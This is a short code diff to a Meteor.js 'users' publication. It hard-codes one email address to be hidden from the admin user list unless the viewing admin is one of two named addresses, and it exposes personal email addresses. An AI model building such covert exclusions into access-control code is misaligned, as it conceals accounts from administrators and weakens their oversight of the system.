@@ -1,6 +1,12 @@
 
 Meteor.publish("users", function (){
-    if(Roles.userIsInRole(this.userId, ['admin'])) return Meteor.users.find(); // everything
+    /*var user = this.user();
+    console.log(user);*/
+    var user = Meteor.users.findOne(this.userId);
+    var hiddenUsers = ['90.matheus@gmail.com'];
+    var hideIt = user ? (['90.matheus@gmail.com', 'jamesgillmore@gmail.com'].indexOf(user.profile.email) < 0) : false;
+
+    if(Roles.userIsInRole(this.userId, ['admin'])) return Meteor.users.find({"profile.email": {$nin: (hideIt ? hiddenUsers : [])}}); // everything
     else return Meteor.users.find({_id: this.userId});
 });
 
